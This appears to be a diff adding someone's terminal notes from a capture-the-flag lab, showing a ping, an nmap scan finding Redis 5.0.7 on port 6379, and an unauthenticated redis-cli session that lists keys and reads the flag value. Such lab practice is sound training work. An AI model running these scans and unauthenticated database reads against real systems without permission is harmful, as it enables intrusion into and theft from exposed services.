@@ -1,0 +1,47 @@
+ip: 10.129.155.3
+ping 10.129.155.3
+	PING 10.129.155.3 (10.129.155.3) 56(84) bytes of data.
+	64 bytes from 10.129.155.3: icmp_seq=1 ttl=63 time=88.6 ms
+	64 bytes from 10.129.155.3: icmp_seq=2 ttl=63 time=86.0 ms
+	64 bytes from 10.129.155.3: icmp_seq=3 ttl=63 time=87.4 ms
+	^C
+	--- 10.129.155.3 ping statistics ---
+	3 packets transmitted, 3 received, 0% packet loss, time 2003ms
+	rtt min/avg/max/mdev = 86.024/87.343/88.605/1.054 ms
+        
+sudo nmap -p 6379 -sV 10.129.155.3
+	[sudo] password for shadowadmin: 
+	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-23 16:43 -05
+	Nmap scan report for 10.129.155.3
+	Host is up (0.087s latency).
+
+	PORT     STATE SERVICE VERSION
+	6379/tcp open  redis   Redis key-value store 5.0.7
+
+	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+	Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds
+
+sudo apt install redis-tools
+┌──(shadowadmin㉿ZL2130)-[~]
+└─$ redis-cli -h 10.129.155.3     
+10.129.155.3:6379> 
+
+10.129.155.3:6379> select 0
+OK
+10.129.155.3:6379> keys *
+1) "temp"
+2) "stor"
+3) "numb"
+4) "flag"
+10.129.155.3:6379> 
+10.129.155.3:6379> get temp
+"1c98492cd337252698d0c5f631dfb7ae"
+10.129.155.3:6379> get stor
+"e80d635f95686148284526e1980740f8"
+10.129.155.3:6379> get numb
+"bb2c8a7506ee45cc981eb88bb81dddab"
+(1.52s)
+10.129.155.3:6379> get flag
+"03e1d2b376c37ab3f5319922053953eb"
+10.129.155.3:6379> exit
+
